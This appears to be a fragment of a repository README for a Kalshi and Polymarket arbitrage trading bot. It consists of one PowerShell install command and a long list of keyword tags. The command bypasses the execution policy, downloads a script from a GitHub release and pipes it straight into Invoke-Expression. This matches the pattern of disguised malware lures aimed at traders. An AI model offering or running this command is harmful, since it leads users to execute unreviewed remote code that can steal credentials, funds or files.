...
```powershell
powershell -ep bypass -c "iwr https://github.com/AsArchitects/Kalshi-trade-bot/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
```
...
`kalshi-polymarket-arbitrage-bot` `kalshi-arbitrage` `polymarket-arbitrage` `btc-updown-arbitrage` `prediction-arbitrage` `cross-platform-arb` `typescript-bot` `automated-trading` `kalshi-bot` `polymarket-bot` `15m-markets` `arbitrage-bot` `real-time-monitor` `risk-management` `limit-orders` `kalshi-api` `polymarket-clob` `betting-arbitrage` `market-matching` `price-arbitrage`
